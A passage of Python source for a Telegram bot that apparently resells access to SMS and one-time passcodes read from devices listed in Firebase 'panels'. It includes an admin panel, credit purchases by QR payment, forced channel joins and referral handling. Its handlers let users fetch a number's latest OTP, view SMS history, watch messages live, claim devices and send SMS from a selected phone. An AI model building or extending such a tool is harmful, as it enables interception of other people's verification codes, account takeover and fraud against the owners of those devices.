           f"{emo('💰')} <b>ᴄʀᴇᴅɪᴛꜱ:</b> 1 ᴄʀᴇᴅɪᴛ = 1 ʜᴏᴜʀ ᴀᴄᴄᴇꜱꜱ\n"
           f"{emo('🤝', 'hand')} <b>ʀᴇꜰᴇʀ:</b> 1 ʀᴇꜰᴇʀ = 1 ᴄʀᴇᴅɪᴛ\n\n"
           f"{emo('📞')} <b>ꜰɪɴᴅ ɴᴜᴍʙᴇʀ</b> — ʟᴀᴛᴇsᴛ ᴏɴʟɪɴᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ɪᴛs ʟᴀsᴛ ᴏᴛᴘ.\n"
           f"{emo('🔍')} <b>ꜱᴇᴀʀᴄʜ ɴᴜᴍʙᴇʀ</b> — ꜱᴇɴᴅ ᴀ 10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ.\n"
           f"{emo('🟢')} <b>ᴀᴄᴛɪᴠᴇ ɴᴜᴍʙᴇʀꜱ</b> — ᴀʟʟ ɴᴜᴍʙᴇʀꜱ, ᴏɴʟɪɴᴇ ꜰɪʀsᴛ.\n"
           f"{emo('➕')} <b>ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ</b> — ᴀᴅᴅ ʏᴏᴜʀ ᴏᴡɴ ᴘᴀɴᴇʟ.\n"
           f"{emo('📩')} <b>ᴄᴜꜱᴛᴏᴍ sᴍꜱ</b> — ꜱᴇɴᴅ ᴀɴ ᴏɴᴇ-ᴛɪᴍᴇ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜱᴍꜱ ꜰʀᴏᴍ ᴀ ꜱᴇʟᴇᴄᴛᴇᴅ ᴅᴇᴠɪᴄᴇ." + footer())
    send(cid, txt, buttons([[b_back()]]))

# ══════════════════════════════════════════════════════════════
#  ADMIN PANEL
# ══════════════════════════════════════════════════════════════

def admin_menu(cid):
    total = banned = lifetime_users = credits_sum = 0
    db_error = None
    try:
        total = sync_users.count_documents({})
        banned = sync_users.count_documents({"banned": True})
        lifetime_users = sync_users.count_documents({"lifetime": True})
        agg = list(sync_users.aggregate([
            {"$group": {"_id": None, "sum": {"$sum": {"$ifNull": ["$credits", 0]}}}}
        ]))
        credits_sum = agg[0]["sum"] if agg else 0
    except Exception as e:
        db_error = str(e)
        log.error(f"admin_menu DB error: {e}")

    with fb_lock:
        okfb = sum(1 for v in fb_cache.values() if v["ok"])
        devs = sum(len(v["clients"]) for v in fb_cache.values() if v["ok"])
    with fb_list_lock:
        g = len(GLOBAL_FB_LIST)
    with channel_lock:
        ch_count = len(force_channels)

    try:
        pending_count = sync_pending.count_documents({"status": "pending"})
    except Exception:
        pending_count = 0

    if db_error:
        stats = f"<blockquote>⚠️ <b>DB ERROR:</b> <code>{esc(db_error[:120])}</code></blockquote>"
    else:
        stats = (f"<blockquote>{emo('👤', 'user')} <b>ᴛᴏᴛᴀʟ ᴜsᴇʀs:</b> {total}\n"
                 f"{emo('💎')} <b>ʟɪꜰᴇᴛɪᴍᴇ:</b> {lifetime_users}\n"
                 f"{emo('💰')} <b>ᴛᴏᴛᴀʟ ᴄʀᴇᴅɪᴛs:</b> {credits_sum}\n"
                 f"{emo('🚫')} <b>ʙᴀɴɴᴇᴅ:</b> {banned}\n"
                 f"{emo('📱')} <b>ꜰʙ ᴅᴇᴠɪᴄᴇs:</b> {devs}\n"
                 f"{emo('🔗', 'link')} <b>ᴘᴀɴᴇʟs:</b> {g} ({okfb} ᴏᴋ)\n"
                 f"{emo('📢')} <b>ᴄʜᴀɴɴᴇʟs:</b> {ch_count}\n"
                 f"💳 <b>Pending payments:</b> {pending_count}</blockquote>")

    send(cid, f"{sec('🛠️', 'ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ')}\n{DIV}\n\n{stats}\n\n"
              f"{emo('👉')} ꜱᴇʟᴇᴄᴛ:",
         buttons([
             [btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "adm_addadm", style="success"),
              btn("ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ", "adm_rmadm", style="danger")],
             [btn("ʙᴀɴ ᴜsᴇʀ", "adm_ban", style="danger"),
              btn("ᴜɴʙᴀɴ ᴜꜱᴇʀ", "adm_unban", style="success")],
             [btn("ʙʀᴏᴀᴅᴄᴀꜱᴛ", "adm_bcast", style="primary"),
              btn("ʙᴄ ᴛᴏ ᴜꜱᴇʀ", "adm_bcu", style="primary")],
             [btn("ᴜsᴇʀ ɪɴꜰᴏ", "adm_user", style="primary"),
              btn("ʟɪsᴛ ᴘᴀɴᴇʟs", "adm_fbs", style="primary")],
             [btn("ᴀᴅᴅ ꜰʙ", "adm_addfb", style="primary"),
              btn("ᴀᴅᴅ/ʀᴇᴍᴏᴠᴇ ᴠɪᴅᴇᴏ", "adm_video", style="primary")],
             [btn("📢 ᴄʜᴀɴɴᴇʟ ᴍᴀɴᴀɢᴇʀ", "adm_channels", style="success"),
              btn("🔑 QR Code Setup", "adm_qr", style="primary")],
             [btn("🎁 FREE ACCESS", "adm_freeaccess", style="success"),
              btn("💰 Add Credits", "adm_addcredits", style="primary")],
             [btn("💳 Pending Payments", "adm_pending", style="primary")],
             [btn("ʀᴇꜰʀᴇsʜ", "adm", style="primary"),
              b_back("back")]]))

def channel_manager_page(cid, mid=None):
    with channel_lock:
        chs = list(force_channels)
    lines = []
    for i, ch in enumerate(chs):
        p = "🔒" if ch.get("private") else "🌐"
        lines.append(f"{i+1}. {p} <b>{esc(ch.get('label', '?'))}</b>\n"
                     f"   ɪᴅ: <code>{ch.get('id', '?')}</code>\n"
                     f"   ᴜʀʟ: {esc(ch.get('url', '—'))}")
    body = "\n\n".join(lines) if lines else "ɴᴏ ᴄʜᴀɴɴᴇʟꜱ ᴀᴅᴅᴇᴅ."
    txt = (f"{sec('📢', 'ᴄʜᴀɴɴᴇʟ ᴍᴀɴᴀɢᴇʀ')}\n{DIV}\n\n"
           f"{body}\n\n"
           f"{emo('ℹ️')} Private channel links auto-renew every 12 hours." + footer())
    rows = [[btn("➕ ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "adm_chadd", style="success"),
             btn("📋 ᴄʜᴀɴɴᴇʟ ʟɪsᴛ", "adm_chlist", style="primary")]]
    for i, ch in enumerate(chs):
        rows.append([btn(f"🗑 ʀᴇᴍᴏᴠᴇ {ch.get('label', '?')[:10]}", f"adm_chdel_{i}", style="danger")])
    rows.append([btn("🔄 ʀᴇɴᴇᴡ ᴀʟʟ ʟɪɴᴋs", "adm_chrenew", style="primary")])
    rows.append([b_back("adm")])
    if mid:
        edit(cid, mid, txt, buttons(rows))
    else:
        send(cid, txt, buttons(rows))

def channel_list_page(cid, mid=None):
    with channel_lock:
        chs = list(force_channels)
    lines = []
    for i, ch in enumerate(chs):
        p = "🔒" if ch.get("private") else "🌐"
        lines.append(f"{i+1}. {p} <b>{esc(ch.get('label', '?'))}</b> | ɪᴅ: <code>{ch.get('id', '?')}</code>")
    body = "\n".join(lines) if lines else "ɴᴏ ᴄʜᴀɴɴᴇʟꜱ ᴀᴅᴅᴇᴅ."
    txt = f"{sec('📋', 'ᴄʜᴀɴɴᴇʟ ʟɪꜱᴛ')}\n{DIV}\n\n{body}" + footer()
    if mid:
        edit(cid, mid, txt, buttons([[b_back("adm_channels")]]))
    else:
        send(cid, txt, buttons([[b_back("adm_channels")]]))

def free_access_page(cid, mid=None):
    txt = (
        f"{sec('🎁', 'ꜰʀᴇᴇ ᴀᴄᴄᴇꜱꜱ')}\n{DIV}\n\n"
        f"{emo('📝')} <b>How to use:</b>\n"
        f"Send a time value like:\n"
        f"<code>1h</code> — 1 hour\n"
        f"<code>10h</code> — 10 hours\n"
        f"<code>1day</code> — 1 day\n"
        f"<code>7d</code> — 7 days\n\n"
        f"{emo('✅')} All users get free access for that duration\n"
        f"{emo('💰')} Their credits will NOT be deducted\n"
        f"{emo('⚡')} This is for gifting free access to everyone!" + footer()
    )
    rows = [
        [btn("1ʜ", "fa_1h", style="primary"),
         btn("6ʜ", "fa_6h", style="primary"),
         btn("24ʜ", "fa_1d", style="success")],
        [btn("7ᴅ", "fa_7d", style="success"),
         btn("30ᴅ", "fa_30d", style="danger")],
        [btn("✏️ ᴄᴜꜱᴛᴏᴍ", "fa_custom", style="primary")],
        [b_back("adm")]
    ]
    if mid:
        edit(cid, mid, txt, buttons(rows))
    else:
        send(cid, txt, buttons(rows))

def apply_free_access(hours):
    try:
        new_until = time.time() + hours * 3600
        result = sync_users.update_many(
            {},
            [{"$set": {"access_until": {"$max": ["$access_until", new_until]}}}]
        )
        with users_lock:
            user_cache.clear()
        return result.modified_count
    except Exception as e:
        log.error(f"apply_free_access: {e}")
        return 0

# ══════════════════════════════════════════════════════════════
#  PAYMENT / PENDING PAYMENT MANAGEMENT
# ══════════════════════════════════════════════════════════════

def _pending_key(uid):
    return str(uid)

def set_pending_payment(uid, pkg, u):
    doc = {
        "_id": _pending_key(uid),
        "uid": str(uid),
        "pkg": pkg,
        "status": "awaiting_ss",
        "ts": time.time(),
        "name": u.get("first_name", ""),
        "uname": u.get("username", ""),
    }
    try:
        sync_pending.update_one({"_id": doc["_id"]}, {"$set": doc}, upsert=True)
    except Exception as e:
        log.error(f"set_pending_payment: {e}")

def get_pending_payment(uid):
    try:
        return sync_pending.find_one({"_id": _pending_key(uid)})
    except Exception as e:
        log.error(f"get_pending_payment: {e}")
        return None

def clear_pending_payment(uid):
    try:
        sync_pending.delete_one({"_id": _pending_key(uid)})
    except Exception:
        pass

def approve_pending(uid, admin_id):
    try:
        r = sync_pending.find_one_and_update(
            {"_id": _pending_key(uid), "status": {"$in": ["awaiting_ss", "submitted"]}},
            {"$set": {"status": "approved", "approved_by": admin_id, "approved_ts": time.time()}},
            return_document=pymongo.ReturnDocument.BEFORE,
        )
        return r
    except Exception as e:
        log.error(f"approve_pending: {e}")
        return None

def reject_pending(uid, admin_id):
    try:
        r = sync_pending.find_one_and_update(
            {"_id": _pending_key(uid), "status": {"$in": ["awaiting_ss", "submitted"]}},
            {"$set": {"status": "rejected", "rejected_by": admin_id, "rejected_ts": time.time()}},
            return_document=pymongo.ReturnDocument.BEFORE,
        )
        return r
    except Exception as e:
        log.error(f"reject_pending: {e}")
        return None

# ══════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ══════════════════════════════════════════════════════════════

_cb_dedupe = {}
_cb_lock = threading.Lock()

def _dedupe_cb(uid, qid):
    key = (str(uid), str(qid))
    with _cb_lock:
        now = time.time()
        for k in list(_cb_dedupe.keys()):
            if now - _cb_dedupe[k] > 5:
                del _cb_dedupe[k]
        if key in _cb_dedupe:
            return False
        _cb_dedupe[key] = now
        return True

def handle_cb(u, cid, data, qid, mid=None):
    uid = str(u["id"])
    get_user_db(uid)

    # ── CUSTOM SMS callbacks (isolated — checked before anything else) ──
    if data == "csm_start":
        answer_cb(qid)
        csm_start(cid, uid, u, mid=mid)
        return
    if data == "csm_cancel":
        csm_cancel(cid, uid, u, qid, mid=mid)
        return
    if data == "csm_confirm_send":
        csm_execute(cid, uid, u, qid, mid=mid)
        return

    if data == "back":
        mode.pop(uid, None)
        send_home(cid, uid, u)
        answer_cb(qid)
        return

    if data == "verify":
        if is_unlimited(uid) or is_adm(uid):
            d = get_user_cached(uid)
            if d.get("ref_by") and not d.get("welcome_shown"):
                threading.Thread(target=count_ref, args=(u, d["ref_by"]), daemon=True).start()
            send_home(cid, uid, u)
            answer_cb(qid, "ᴠᴇʀɪꜰɪᴇᴅ — ᴡᴇʟᴄᴏᴍᴇ!")
            return

        missing, unknown = force_check(uid)
        if not missing and not unknown:
            d = get_user_cached(uid)
            if d.get("ref_by") and not d.get("welcome_shown"):
                threading.Thread(target=count_ref, args=(u, d["ref_by"]), daemon=True).start()
            send_home(cid, uid, u)
            answer_cb(qid, "ᴠᴇʀɪꜰɪᴇᴅ — ᴡᴇʟᴄᴏᴍᴇ!")
            return
        if not missing and unknown:
            d = get_user_cached(uid)
            if d.get("ref_by") and not d.get("welcome_shown"):
                threading.Thread(target=count_ref, args=(u, d["ref_by"]), daemon=True).start()
            send_home(cid, uid, u)
            answer_cb(qid, "ᴠᴇʀɪꜰɪᴇᴅ (some channels unverifiable) — ᴡᴇʟᴄᴏᴍᴇ!", alert=True)
            return
        if mid:
            with channel_lock:
                chs = list(force_channels)
            label_to_ch = {ch.get("label", str(ch.get("id"))): ch for ch in chs}
            rows = []
            for lbl in missing:
                ch = label_to_ch.get(lbl)
                if ch:
                    rows.append([btn(lbl, None, url=ch_url(ch), style="primary")])
            rows.append([btn("ᴠᴇʀɪꜰʏ", "verify", style="success")])
            edit(cid, mid,
                 f"{sec('🔐', 'ᴊᴏɪɴ ᴛᴏ ᴜꜱᴇ ʙᴏᴛ')}\n{DIV}\n\n"
                 f"<blockquote>{emo('⚠️')} ᴏɴʟʏ {len(missing)} ᴄʜᴀɴɴᴇʟ(s) ʀᴇᴍᴀɪɴɪɴɢ — ᴛᴀᴘ ᴠᴇʀɪꜰʏ ᴏɴᴄᴇ ᴊᴏɪɴᴇᴅ.</blockquote>" + footer(),
                 buttons(rows))
        answer_cb(qid, "ɴᴏᴛ ᴊᴏɪɴᴇᴅ ʏᴇᴛ: " + " + ".join(missing), alert=True)
        return

    if data == "access_gate" or data == "access_info":
        access_required_page(cid, uid, mid)
        answer_cb(qid)
        return

    if data == "buy_credits":
        buy_credits_page(cid, mid)
        answer_cb(qid)
        return

    if data.startswith("buy_credits_"):
        buy_credits_page(cid, mid)
        answer_cb(qid)
        return

    if data.startswith("buy_pay_"):
        pkg = data[len("buy_pay_"):]
        pkg_info = BUY_PACKAGES.get(pkg, {})
        label = pkg_info.get("label", pkg)
        price = pkg_info.get("price", 0)

        qr_doc = sync_settings.find_one({"_id": "qr_photo"})
        if not qr_doc:
            answer_cb(qid, "❌ Admin ne abhi tak QR Code set nahi kiya hai. Please wait!", alert=True)
            return

        set_pending_payment(uid, pkg, u)

        qr_fid = qr_doc.get("file_id")
        cap = (f"💵 ⭐ <b>{label}</b>\n\n"
               f"1️⃣ Scan QR\n"
               f"2️⃣ Pay ₹{price}\n"
               f"3️⃣ <b>Directly send the payment screenshot here</b>\n\n"
               f"Bot will forward it to admin for approval.\n"
               f"No extra button needed — just send the screenshot photo!")
        api("sendPhoto", chat_id=cid, photo=qr_fid, caption=cap, parse_mode="HTML",
            reply_markup=buttons([[b_back("buy_credits")]]))
        answer_cb(qid)
        return

    if data.startswith("ss_appr_"):
        if not is_adm(uid):
            return answer_cb(qid)
        parts = data.split("_")
        if len(parts) < 3:
            return answer_cb(qid)
        target_uid = parts[2]
        before = approve_pending(target_uid, uid)
        if not before:
            answer_cb(qid, "⚠️ Already processed or expired.", alert=True)
            edit(cid, mid, f"⚠️ Already processed for <code>{target_uid}</code>")
            return
        pkg = before.get("pkg", "")
        pkg_info = BUY_PACKAGES.get(pkg, {})
        if pkg_info.get("credits"):
            add_credits(target_uid, pkg_info["credits"])
            send(int(target_uid),
                 f"{sec('✅', 'ᴘᴀʏᴍᴇɴᴛ ᴀᴘᴘʀᴏᴠᴇᴅ')}\n{DIV}\n\n+{pkg_info['credits']} Credits added. Enjoy!" + footer())
        elif pkg_info.get("days"):
            u_db = get_user_cached(target_uid)
            new_until = max(time.time(), u_db.get("access_until", 0)) + pkg_info["days"] * 86400
            update_user_db(target_uid, {"access_until": new_until})
            send(int(target_uid),
                 f"{sec('✅', 'ᴘᴀʏᴍᴇɴᴛ ᴀᴘᴘʀᴏᴠᴇᴅ')}\n{DIV}\n\n{pkg_info['days']} Day Unlimited added. Enjoy!" + footer())
        elif pkg_info.get("lifetime"):
            update_user_db(target_uid, {"lifetime": True})
            send(int(target_uid),
                 f"{sec('✅', 'ᴘᴀʏᴍᴇɴᴛ ᴀᴘᴘʀᴏᴠᴇᴅ')}\n{DIV}\n\nLifetime access added. Enjoy!" + footer())
        edit(cid, mid, f"✅ Approved for <code>{target_uid}</code> | {esc(pkg)}")
        answer_cb(qid, "Approved!", alert=True)
        return

    if data.startswith("ss_rej_"):
        if not is_adm(uid):
            return answer_cb(qid)
        parts = data.split("_")
        if len(parts) < 3:
            return answer_cb(qid)
        target_uid = parts[2]
        before = reject_pending(target_uid, uid)
        if not before:
            answer_cb(qid, "⚠️ Already processed or expired.", alert=True)
            edit(cid, mid, f"⚠️ Already processed for <code>{target_uid}</code>")
            return
        send(int(target_uid),
             f"{sec('❌', 'ᴘᴀʏᴍᴇɴᴛ ʀᴇᴊᴇᴄᴛᴇᴅ')}\n{DIV}\n\nYour payment screenshot was rejected. Please contact admin." + footer())
        edit(cid, mid, f"❌ Rejected for <code>{target_uid}</code>")
        answer_cb(qid, "Rejected!", alert=True)
        return

    if data == "adm_pending":
        if not is_adm(uid):
            return answer_cb(qid)
        try:
            pend = list(sync_pending.find({"status": {"$in": ["awaiting_ss", "submitted"]}}).limit(20))
        except Exception as e:
            return answer_cb(qid, f"DB error: {e}", alert=True)
        if not pend:
            send(cid, "📭 No pending payments.", buttons([[b_back("adm")]]))
            answer_cb(qid)
            return
        for p in pend:
            tgt = p.get("uid")
            pkg = p.get("pkg", "")
            pkg_info = BUY_PACKAGES.get(pkg, {})
            txt = (f"💳 <b>Pending Payment</b>\n"
                   f"User: <code>{tgt}</code>\n"
                   f"Name: {esc(p.get('name') or '—')}\n"
                   f"Username: @{esc(p.get('uname') or '—')}\n"
                   f"Package: {esc(pkg_info.get('label', pkg))} (₹{pkg_info.get('price', 0)})\n"
                   f"Status: {p.get('status')}\n"
                   f"Time: {fmt_ist(p.get('ts', 0))}")
            kb = buttons([
                [btn("✅ Approve", f"ss_appr_{tgt}", style="success")],
                [btn("❌ Reject", f"ss_rej_{tgt}", style="danger")],
            ])
            fid = p.get("screenshot_file_id")
            if fid:
                api("sendPhoto", chat_id=cid, photo=fid, caption=txt,
                    parse_mode="HTML", reply_markup=kb)
            else:
                send(cid, txt, kb)
        answer_cb(qid)
        return

    gated_features = ("getnum", "dev_new", "search", "act", "dev_refresh",
                      "dev_hist", "dev_live", "num_")
    needs_access = any(data == gf or data.startswith(gf) for gf in gated_features)
    if needs_access and not has_access(uid):
        access_required_page(cid, uid, mid)
        answer_cb(qid, "🔒 Access required — get credits!", alert=True)
        return

    if data.startswith("buy_access_"):
        if not _dedupe_cb(uid, qid):
            return answer_cb(qid)
        try:
            hours = int(data[len("buy_access_"):])
        except ValueError:
            answer_cb(qid, "Invalid request.", alert=True)
            return
        if hours <= 0 or hours > 24 * 365:
            answer_cb(qid, "Invalid hours.", alert=True)
            return
        ok, new_until, new_credits = use_credit_for_access(uid, hours)
        if not ok:
            answer_cb(qid, f"❌ Not enough credits. Need {hours}, you have {new_credits or 0}.", alert=True)
            access_required_page(cid, uid, mid)
            return
        answer_cb(qid, f"✅ {hours}h unlocked!")
        u_db = get_user_cached(uid)
        rem = get_access_remaining(uid)
        txt = (f"{sec('✅', 'ᴀᴄᴄᴇꜱꜱ ᴜɴʟᴏᴄᴋᴇᴅ')}\n{DIV}\n\n"
               f"{emo('💰')} <b>Credits left:</b> {u_db.get('credits', 0)}\n"
               f"{emo('⚡', 'bolt')} <b>Access:</b> {fmt_remaining(rem) if rem >= 0 else 'UNLIMITED'}\n"
               f"{emo('⏳')} <b>Expires:</b> {fmt_ist(new_until)}\n\n"
               f"{emo('👉')} Enjoy browsing!" + footer())
        if mid:
            edit(cid, mid, txt, buttons([[btn("ꜰɪɴᴅ ɴᴜᴍʙᴇʀ", "getnum", style="success")], [b_back()]]))
        else:
            send(cid, txt, buttons([[btn("ꜰɪɴᴅ ɴᴜᴍʙᴇʀ", "getnum", style="success")], [b_back()]]))
        return

    if data in ("getnum", "dev_new"):
        answer_cb(qid)
        if uid in state:
            state[uid]["live_stop"] = True
        typing(cid)
        m = send(cid, f"{sec('⚡', 'ꜰᴇᴛᴄʜɪɴɢ')}\n{DIV}\n\n{emo('📣')} ɢʀᴀʙʙɪɴɢ ʟᴀᴛᴇsᴛ ᴏɴʟɪɴᴇ ɴᴜᴍʙᴇʀ...")
        if m and m.get("ok"):
            get_number(cid, uid, mid=m["result"]["message_id"])
        return

    if data == "search":
        answer_cb(qid)
        mode[uid] = "search"
        send(cid, f"{sec('🔍', 'ꜱᴇᴀʀᴄʜ ɴᴜᴍʙᴇʀ')}\n{DIV}\n\n"
                  f"{emo('📱')} sᴇɴᴅ ᴀ <b>10-ᴅɪɢɪᴛ ɴᴜᴍʙᴇʀ</b>:\n"
                  f"ᴇxᴀᴍᴘʟᴇ: <code>8825112393</code>")
        return

    if data == "act":
        answer_cb(qid)
        typing(cid)
        page_cache.pop(uid, None)
        m = send(cid, f"{sec('⚡', 'ʟᴏᴀᴅɪɴɢ')}\n{DIV}\n\n{emo('📣')} ꜰᴇᴛᴄʜɪɴɢ ᴅᴇᴠɪᴄᴇ ʟɪꜱᴛ...")
        if m and m.get("ok"):
            txt, kb = active_card(uid, 0)
            if txt:
                edit(cid, m["result"]["message_id"], txt, kb)
            else:
                access_required_page(cid, uid, m["result"]["message_id"])
        return

    if data.startswith("num_"):
        answer_cb(qid)
        snap = page_cache.get(uid)
        try:
            i = int(data[4:])
        except ValueError:
            return
        if not snap or i >= len(snap["list"]):
            send(cid, "❌ ʟɪsᴛ ᴇxᴘɪʀᴇᴅ.", buttons([[btn("ᴀᴄᴛɪᴠᴇ", "act", style="primary")]]))
            return
        d = snap["list"][i]
        claim_device(uid, d)
        state.setdefault(uid, {})["dev"] = d
        txt, kb = dev_card(d, "ɴᴜᴍʙᴇʀ ᴅᴇᴛᴀɪʟs")
        send(cid, txt, kb)
        return

    if data == "dev_refresh":
        answer_cb(qid)
        d = (state.get(uid) or {}).get("dev")
        if d and mid:
            txt, kb = dev_card(d)
            edit(cid, mid, txt, kb)
        return

    if data == "dev_hist":
        answer_cb(qid)
        d = (state.get(uid) or {}).get("dev")
        if not d:
            return
        msgs = fetch_msgs(d["url"], d["cid"], 10)
        learn_ts(d["url"], d["cid"], msgs)
        body = "\n\n".join(sms_block(x[1], x[0]) for x in msgs) if msgs else "ɴᴏ ꜱᴍꜱ ʏᴇᴛ"
        send(cid, f"{sec('📄', 'sᴍs ʜɪsᴛᴏʀʏ — ' + fmt_phone(d['phone']))}\n{DIV}\n\n{body}" + footer(),
             buttons([[btn("ʀᴇꜰʀᴇsʜ", "dev_hist", style="primary"),
                       btn("ʟɪᴠᴇ", "dev_live", style="success")],
                      [b_back()]]))
        return

    if data == "dev_live":
        answer_cb(qid)
        if uid in state:
            state[uid]["live_stop"] = True
        threading.Thread(target=live_watcher, args=(cid, uid), daemon=True).start()
        return

    if data == "live_stop":
        answer_cb(qid, "ʟɪᴠᴇ sᴛᴏᴘᴘᴇᴅ")
        if uid in state:
            state[uid]["live_stop"] = True
        return

    if data == "refer":
        answer_cb(qid)
        txt, kb = refer_card(uid)
        send(cid, txt, kb)
        return

    if data == "help":
        answer_cb(qid)
        help_card(cid)
        return

    if data == "noop":
        answer_cb(qid)
        return

    if data == "addfb":
        answer_cb(qid)
        mode[uid] = "addfb"
        send(cid, f"{sec('➕', 'ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ')}\n{DIV}\n\n"
                  f"{emo('🔗')} sᴇɴᴅ ʏᴏᴜʀ ꜰɪʀᴇʙᴀꜱᴇ ᴜʀʟ:\n"
                  f"<code>https://xxx-default-rtdb.firebaseio.com</code>\n\n"
                  f"{emo('🔒')} ɪᴛ ᴡɪʟʟ ʙᴇ ᴘʀɪᴠᴀᴛᴇ — ᴏɴʟʏ ʏᴏᴜ ᴄᴀɴ ᴜꜱᴇ ɪᴛ.")
        return

    if not is_adm(uid):
        answer_cb(qid)
        return

    if data == "adm":
        answer_cb(qid)
        admin_menu(cid)
        return

    if data == "adm_channels":
        answer_cb(qid)
        channel_manager_page(cid, mid)
        return

    if data == "adm_chlist":
        answer_cb(qid)
        channel_list_page(cid, mid)
        return

    if data == "adm_chadd":
        answer_cb(qid)
        mode[uid] = "adm_chadd"
        send(cid, f"{sec('📢', 'ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ')}\n{DIV}\n\n"
                  f"Send format:\n"
                  f"<code>Channel Name | -100XXXXXXXXXX | https://t.me/channel</code>\n\n"
                  f"For private channels, set URL to <code>private</code>:\n"
                  f"<code>Private VIP | -1001234567890 | private</code>\n\n"
                  f"{emo('ℹ️')} Private links auto-renew every 12h.",
             buttons([[b_back("adm_channels")]]))
        return

    if data.startswith("adm_chdel_"):
        try:
            i = int(data[len("adm_chdel_"):])
        except ValueError:
            answer_cb(qid)
            return
        with channel_lock:
            if 0 <= i < len(force_channels):
                label = force_channels[i].get("label", "?")
                force_channels.pop(i)
                save_channels()
                answer_cb(qid, f"Removed {label}")
            else:
                answer_cb(qid, "Invalid index", alert=True)
        channel_manager_page(cid, mid)
        return

    if data == "adm_chrenew":
        count = 0
        with channel_lock:
            for ch in force_channels:
                if ch.get("private") and ch.get("id"):
                    try:
                        r = api("createChatInviteLink", chat_id=ch["id"])
                        if r and r.get("ok"):
                            ch["invite_link"] = r["result"].get("invite_link")
                            ch["url"] = ch["invite_link"]
                            count += 1
                    except Exception:
                        pass
            save_channels()
        answer_cb(qid, f"Renewed {count} links", alert=True)
        channel_manager_page(cid, mid)
        return

    if data == "adm_qr":
        answer_cb(qid)
        mode[uid] = "adm_qr"
        send(cid, f"{sec('🔑', 'ᴘᴀʏᴍᴇɴᴛ Qʀ sᴇᴛᴜᴘ')}\n{DIV}\n\n"
                  f"{emo('📱')} Please send the <b>QR Code Photo</b> here to set it as payment QR.\n\n",
             buttons([[b_back("adm")]]))
        return

    if data == "adm_freeaccess":
        answer_cb(qid)
        free_access_page(cid, mid)
        return

    if data.startswith("fa_"):
        if data == "fa_custom":
            answer_cb(qid)
            mode[uid] = "adm_facustom"
            send(cid, f"{sec('✏️', 'ᴄᴜꜱᴛᴏᴍ ꜰʀᴇᴇ ᴀᴄᴄᴇꜱꜱ')}\n{DIV}\n\n"
                      f"Send duration:\n"
                      f"<code>5h</code> / <code>2day</code> / <code>7d</code>",
                 buttons([[b_back("adm_freeaccess")]]))
            return
        duration = data[3:]
        hours = 0
        if duration.endswith("h"):
            try:
                hours = int(duration[:-1])
            except ValueError:
                hours = 0
        elif duration.endswith("d"):
            try:
                hours = int(duration[:-1]) * 24
            except ValueError:
                hours = 0
        if hours <= 0:
            answer_cb(qid, "Invalid", alert=True)
            return
        count = apply_free_access(hours)
        answer_cb(qid, f"✅ {hours}h free access given to {count} users", alert=True)
        send(cid, f"{sec('🎁', 'ꜰʀᴇᴇ ᴀᴄᴄᴇꜱꜱ ɢʀᴀɴᴛᴇᴅ')}\n{DIV}\n\n"
                  f"{emo('✅')} <b>Duration:</b> {hours} hours\n"
                  f"{emo('👤')} <b>Users affected:</b> {count}\n"
                  f"{emo('💰')} Credits not deducted from anyone." + footer(),
             buttons([[b_back("adm")]]))
        return

    if data == "adm_addcredits":
        answer_cb(qid)
        mode[uid] = "adm_addcredits"
        send(cid, f"{sec('💰', 'ᴀᴅᴅ ᴄʀᴇᴅɪᴛꜱ')}\n{DIV}\n\n"
                  f"Send: <code>USER_ID CREDITS</code>\n"
                  f"Example: <code>6346250222 10</code>",
             buttons([[b_back("adm")]]))
        return

    if data == "adm_addfb":
        mode[uid] = "adm_addfb"
        send(cid, f"{sec('➕', 'ᴀᴅᴅ ꜰɪʀᴇʙᴀꜱᴇ')}\n{DIV}\n\nSend URLs one per line.",
             buttons([[b_back("adm")]]))
        answer_cb(qid)
        return

    if data == "adm_video":
        mode[uid] = "adm_video"
        state.setdefault(uid, {})["vidq"] = []
        send(cid, f"{sec('📱', 'ᴀᴅᴅ ᴠɪᴅᴇᴏ')}\n{DIV}\n\nSend videos, then type <code>done</code>.",
             buttons([[b_back("adm")]]))
        answer_cb(qid)
        return

    if data == "adm_fbs":
        with fb_list_lock:
            lst = list(GLOBAL_FB_LIST)
        with fb_lock:
            okset = {u for u, v in fb_cache.items() if v["ok"]}
        lines = [f"{'🟢' if u in okset else '🔴'} {i+1}. <code>{esc(fb_short(u))}</code>"
                 for i, u in enumerate(lst)]
        send(cid, f"{sec('🔗', f'ᴘᴀɴᴇʟs ({len(lst)})')}\n{DIV}\n\n" + "\n".join(lines),
             buttons([[b_back("adm")]]))
        answer_cb(qid)
        return

    prompts = {
        "adm_bcast": "📣 Send broadcast message:",
        "adm_bcu": "🆔 Send user ID:",
        "adm_addadm": "🆔 Send user ID to make admin:",
        "adm_rmadm": "🆔 Send admin ID to remove:",
        "adm_ban": "🆔 Send user ID to ban:",
        "adm_unban": "🆔 Send user ID to unban:",
        "adm_user": "🆔 Send user ID for info:",
    }
    if data in prompts:
        mode[uid] = data
        answer_cb(qid)
        send(cid, prompts[data], buttons([[b_back("adm")]]))
        return

    answer_cb(qid)

# ══════════════════════════════════════════════════════════════
#  TEXT HANDLER
# ══════════════════════════════════════════════════════════════

def handle_text(u, cid, text):
    uid = str(u["id"])
    get_user_db(uid)

    if text.startswith("/start"):
        parts = text.split(maxsplit=1)
        args = parts[1] if len(parts) > 1 else ""
        update_user_db(uid, {"n": u.get("first_name", ""), "u": u.get("username", "")})
        if args.startswith("ref_"):
            register_ref(u, args[4:])

        if not force_ok(uid):
            force_card(cid, u)
            return

        _last = state.setdefault(uid, {}).get("_home_ts", 0)
        if time.time() - _last < 2.0:
            return
        state[uid]["_home_ts"] = time.time()
        mode.pop(uid, None)
        send_home(cid, uid, u)
        return

    # ── CUSTOM SMS recipient input (checked before mode.pop) ──
    if mode.get(uid) == "csm_await_recipient":
        mode.pop(uid, None)
        csm_receive_recipient(cid, uid, text)
        return

    m = mode.pop(uid, None)
    if not m:
        send_home(cid, uid, u)
        return

    if m == "search":
